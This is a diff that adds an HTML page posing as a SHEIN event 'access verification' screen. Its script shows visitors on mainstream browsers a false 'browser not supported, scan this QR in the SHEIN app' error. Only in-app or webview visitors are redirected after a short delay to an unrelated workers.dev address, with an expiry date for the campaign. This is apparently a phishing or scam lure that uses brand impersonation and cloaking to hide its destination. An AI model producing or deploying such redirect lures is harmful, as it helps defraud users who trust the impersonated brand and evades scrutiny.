@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verifying Access...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      overflow: hidden;
+      color: #00ff88;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      opacity: 0.5;
+    }
+
+    .container {
+      z-index: 1;
+      position: relative;
+      padding: 15vh 20px 0;
+    }
+
+    .loader {
+      border: 8px solid #222;
+      border-top: 8px solid #00ff88;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    p {
+      color: #aaffcc;
+    }
+
+    .error {
+      color: #ff4444;
+      font-weight: bold;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="matrix"></canvas>
+
+  <div class="container">
+    <h2>Bravo! We're now finalizing your access...</h2>
+    <div class="loader"></div>
+    <p>Please wait while we redirect you to the final event page.</p>
+
+    <div class="error" id="errorMessage" style="display:none;">❌ This browser is not supported. Please scan this QR using the SHEIN app.</div>
+  </div>
+
+  <script>
+    const expiry = new Date("2025-07-15T23:59:59").getTime();
+    const now = new Date().getTime();
+    const redirectURL = "https://hchejes.itzmebenz13.workers.dev/";
+
+    function isMajorBrowser() {
+      const ua = navigator.userAgent.toLowerCase();
+      return (
+        /chrome|crios|safari|firefox|edg|edge|opera|opr|ucbrowser/.test(ua) &&
+        !/instagram|fbav|line|wechat|inapp|wv|shein/.test(ua)
+      );
+    }
+
+    if (!navigator.onLine) {
+      document.body.innerHTML = "<h2>⚠️ You must be online to continue.</h2>";
+    } else if (now > expiry) {
+      document.body.innerHTML = "<h2>⚠️ This link has expired.</h2>";
+    } else if (isMajorBrowser()) {
+      document.getElementById("errorMessage").style.display = "block";
+    } else {
+      setTimeout(() => {
+        window.location.href = redirectURL;
+      }, 2000);
+    }
+
+    // Matrix Background Animation
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    const columns = canvas.width / 20;
+    const drops = Array(Math.floor(columns)).fill(1);
+    const characters = "アァイィウヴエェオカサタナハマヤラワ0123456789";
+
+    function drawMatrix() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = "#00ff88";
+      ctx.font = "16px monospace";
+
+      drops.forEach((y, i) => {
+        const text = characters.charAt(Math.floor(Math.random() * characters.length));
+        const x = i * 20;
+        ctx.fillText(text, x, y * 20);
+
+        if (y * 20 > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+
+        drops[i]++;
+      });
+    }
+
+    setInterval(drawMatrix, 33);
+
+    window.addEventListener("resize", () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  </script>
+</body>
+</html>
